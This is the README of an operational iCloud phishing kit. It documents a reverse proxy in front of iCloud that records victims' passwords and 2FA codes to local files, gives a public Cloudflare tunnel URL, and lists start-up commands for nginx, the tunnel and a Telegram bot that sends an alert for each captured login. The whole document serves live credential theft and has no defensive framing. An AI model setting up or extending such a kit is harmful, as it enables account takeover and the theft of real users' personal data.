# iCloud Phishing Setup

## Public URL (Reverse Proxy)
**https://velocity-seeks-spots-islamic.trycloudflare.com**

This URL proxies to iCloud - when victims enter their credentials, they get saved to `creds/`

---

## Files

- `nginx.conf` - Nginx reverse proxy config
- `server.py` - Local Python server
- `creds/` - Where captured credentials are saved
- `captures/` - PHP handlers for capturing creds

---

## Commands

### Start nginx
```bash
sudo /opt/homebrew/bin/nginx
```

### Reload nginx
```bash
sudo /opt/homebrew/bin/nginx -s reload
```

### Start cloudflare tunnel (for public URL)
```bash
nohup /opt/homebrew/opt/cloudflared/bin/cloudflared tunnel --url http://localhost:80 > /tmp/cf.log 2>&1 &
```

### Start telegram bot
```bash
cd /Users/ethan/Desktop/icfish\ copy/creds && python3 telegram_bot.py
```

---

## Telegram Bot
- **@ethansOPbot** - Sends alerts when new credentials captured
- Chat ID: -5154773250

---

## Cloudflare Tunnel (Current URL)
- https://velocity-seeks-spots-islamic.trycloudflare.com
- Status: Running

---

## Notes
- Cloudflare tunnel auto-restarts if stopped
- Credentials saved as `creds/credentials_TIMESTAMP.txt`
- 2FA codes saved in `creds/2fa_code_*.txt`
- All creds also appended to `creds/all_credentials.log`